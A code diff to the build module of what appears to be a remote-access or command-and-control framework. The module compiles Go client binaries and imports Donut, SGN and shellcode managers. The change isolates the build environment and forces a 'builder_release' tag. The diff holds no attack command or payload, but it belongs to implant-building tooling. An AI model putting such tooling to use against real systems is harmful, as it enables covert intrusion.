@@ -22,6 +22,7 @@ import { runDonut } from "./donut-manager";
 import { buildLinuxShellcode } from "./linux-shellcode-manager";
 import { runSgn } from "./sgn-manager";
 import { resolveContainedPath } from "./upload-security";
+import { createIsolatedBuildEnv } from "./build-environment";
 
 function isClientModuleDir(dir: string): boolean {
   return (
@@ -749,7 +750,8 @@ export async function startBuildProcess(
     if (hasAssemblyData && hasWindowsTargets) {
       sendToStream({ type: "status", text: "Generating Windows resource data..." });
 
-      const goEnvResult = await $`go env GOPATH`.quiet();
+      const isolatedBuildEnv = createIsolatedBuildEnv();
+      const goEnvResult = await $`go env GOPATH`.env(isolatedBuildEnv).quiet();
       const goPath = goEnvResult.stdout.toString().trim();
       const goBinDir = process.env.GOBIN || (goPath ? path.join(goPath, "bin") : "");
       const winresExe = process.platform === "win32" ? "go-winres.exe" : "go-winres";
@@ -766,7 +768,7 @@ export async function startBuildProcess(
         } catch {
           try {
             sendToStream({ type: "output", text: "Installing go-winres...\n", level: "info" });
-            await $`go install github.com/tc-hib/go-winres@latest`.env({ ...process.env, GOMODCACHE: goModCacheDir }).quiet();
+            await $`go install github.com/tc-hib/go-winres@latest`.env({ ...isolatedBuildEnv, GOMODCACHE: goModCacheDir }).quiet();
             if (goBinDir && fs.existsSync(path.join(goBinDir, winresExe))) {
               winresBin = path.join(goBinDir, winresExe);
               hasWinres = true;
@@ -1051,7 +1053,7 @@ func runBoundFiles() {
       sendToStream({ type: "output", text: `\n=== Building ${platform} ===\n`, level: "info" });
 
       const env: NodeJS.ProcessEnv = {
-        ...process.env,
+        ...createIsolatedBuildEnv(),
         GOOS: effectiveOs,
         GOARCH: actualArch,
         CGO_ENABLED: config.disableCgo === true ? "0" : "1",
@@ -1331,6 +1333,9 @@ func runBoundFiles() {
 
         // Base tags: always present regardless of build pass
         let baseTags: string[] = [];
+        // UI-builder artifacts ignore runtime OVERLORD_* environment overrides.
+        // Direct go run/test builds (including start-dev.bat) do not carry this tag.
+        baseTags.push("builder_release");
         if (config.enableNvenc === false) baseTags.push("no_nvenc");
         if (config.enableAmf === false) baseTags.push("no_amf");
         if (config.enableQsv === false) baseTags.push("no_qsv");
@@ -1418,6 +1423,12 @@ func runBoundFiles() {
         if (skipTarget) {
           sendToStream({ type: "output", text: `Skipping ${platform}; requested by server plugin hook.\n`, level: "warn" });
           continue;
+        }
+
+        // A plugin may replace the tag list, but cannot disable the builder's
+        // environment-isolation contract.
+        if (!baseTags.includes("builder_release")) {
+          baseTags.push("builder_release");
         }
 
         const runBuild = async (tags: string[], outputPath: string) => {
